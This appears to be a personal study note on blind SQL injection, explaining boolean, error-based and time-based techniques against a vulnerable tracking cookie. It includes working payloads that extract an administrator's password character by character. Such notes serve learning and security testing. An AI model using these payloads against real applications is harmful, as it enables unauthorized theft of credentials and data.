---
Title: Blind SQLi
tags:
  - SQLi
  - BLINDSQL
---
Blind SQL is not necessarily being "blind", but rather looking at other intricacies the application returns whenever you inject a query. 

# Exploiting conditional responses

For example, we have this vulnerable cookie.
```
Cookie: TrackingId=abcdefghijklmnopqrstuvwxyz
```
> [!The query that the TrackingId uses ]
> ```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abcdefghijklmnopqrstuvwxyz'

A successful query will return "Welcome!", and an unsuccessful one will return nothing. We can exploit this functionality by injecting arbitrary sql queries, and constantly checking if the query returns "Welcome!" or not.

> [!Example]
> ```sql
> SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abcdefghijklmnopqrstuvwxyz' ' AND '1'='1
> -- above returns true
> SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abcdefghijklmnopqrstuvwxyz' ' AND '1'='2
> -- above returns false

> [!Sample payload]
> ```sql
> -- SUBSTRING(string, position of the string, length of the string(usually 1))
> 
> xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
> -- this function is as follows, where the first letter of the password of administrator is greater than m

# Exploiting Error-Based Condition
Error based sql is focused on error messages that a website returns, and exploiting that to extract sensitive data from the database.

> [!Example]
> ```sql
> xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
> --- in simpler terms: if 1=2, execute 1/0 (1 divided by 0, which returns a database error), else, return 'a'
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

We can exploit these errors, just like we did in [[Blind SQLi]].
> [!Sample Payload]
> ```sql
> xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
> --- If the condition is true, it should return an error, else, the condition will return true because of 'a' = 'a'

To further understand this, let's create the sample query:
> [!Sample query]
> ```sql
> SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'some-id-here'
> --- now let's say for example this is our payload
> --- '||(SELECT '' FROM dual)'
> --- it will appear on the query that will be executed like this
> SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'some-id-here'||(SELECT '' FROM dual)||'
> --- the inside parameter is like an eval, which returns the string ''.
> 

# Exploiting Time-Based Condition
Time-based sqli is using the delay functionality of sql, which we can exploit, together with the techniques we already used.

> [!Example]
> ```sql
> '; IF (1=2) WAITFOR DELAY '0:0:10'--
> -- if the response is true, it will trigger a 10 second delay before sending a response
'; IF (1=1) WAITFOR DELAY '0:0:10'--

> [!Sample payload]
> ```sql
> '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--

# Blind sql with out-of-band interaction


